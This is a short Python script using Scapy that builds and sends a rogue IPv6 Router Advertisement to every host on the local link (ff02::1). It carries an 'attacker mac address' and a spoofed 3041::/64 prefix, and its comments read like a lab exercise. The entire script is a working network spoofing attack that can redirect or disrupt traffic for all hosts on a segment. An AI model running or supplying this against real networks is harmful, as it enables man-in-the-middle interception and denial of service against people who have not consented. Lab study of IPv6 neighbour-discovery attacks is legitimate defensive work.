#!/usr/bin/env python

from scapy.all import * #importing everything from scapy

a=IPv6() # creating an IPv6 packet
a.dst="ff02::1" #setting the address as multicast, i.e. will be send to all
print a.summary(IPv6) # display the details of the lower layer packet created
b=ICMPv6ND_RA() # create a router advertisement here
c = ICMPv6NDOptSrcLLAddr() #the source layer address
c.lladdr="00:0c:29:2d:e6:5c" # attacker mac address
d=ICMPv6NDOptMTU() # number of transfer units
e=ICMPv6NDOptPrefixInfo() # the advertisement prefix as required in the rules
e.prefixlen = 64 # the length
e.prefix="3041::" #the rest feilds will be populated by zero
send(a/b/c/d/e) # sending the packet

# if you wish to learn why so many layers packets are required open scapy create a simple Ipv6 packet and run it , capture the packet in wireshark and look through it.